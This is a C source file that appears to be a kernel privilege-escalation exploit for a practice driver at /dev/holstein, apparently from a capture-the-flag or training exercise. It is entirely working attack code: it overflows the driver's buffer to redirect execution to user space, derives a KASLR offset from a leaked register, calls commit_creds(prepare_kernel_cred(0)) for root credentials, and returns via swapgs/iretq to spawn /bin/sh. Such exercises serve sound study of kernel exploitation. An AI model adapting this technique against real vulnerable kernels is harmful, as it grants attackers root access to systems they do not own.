#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

char buf[0x1000];

unsigned long long user_cs, user_ss, user_rsp, user_rflags;

void *prepare_kernel_cred = (void*)0xffffffff8106e240;
void *commit_creds = (void*)0xffffffff8106e390;

void shell() {
  puts("[+] shell");
  char *argv[] = { "/bin/sh" , NULL };
  char *envp[] = { NULL };
  execve("/bin/sh", argv, envp);
}

void save_state() {
  puts("[+] save_state");
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void restore_state() {
  asm volatile("swapgs\n"
               "movq %0, 0x20(%%rsp)\n"
               "movq %1, 0x18(%%rsp)\n"
               "movq %2, 0x10(%%rsp)\n"
               "movq %3, 0x08(%%rsp)\n"
               "movq %4, 0x00(%%rsp)\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs),
                 "r"(shell+1));
}

void escalate_privilage() {
  unsigned long leak;
  asm volatile(
               "movq %%r8, %0;"
               : "=r"(leak)
               :
               : "memory"
               );
  unsigned long offset = leak - 0xffffffff81ea4608;
  char *(*pkc)(int) = prepare_kernel_cred+offset;
  void (*cc)(char*) = commit_creds+offset;
  cc(pkc(0));
  restore_state();
}

int main() {
  puts("[+] main");
  save_state();
  int fd = open("/dev/holstein", O_RDWR);
  memset(buf, 'A', 0x1000);
  void **rop = (void**)&buf[0x408];
  *rop++ = escalate_privilage;
  write(fd, buf, (void*)rop-(void*)buf);
  return 0;
}

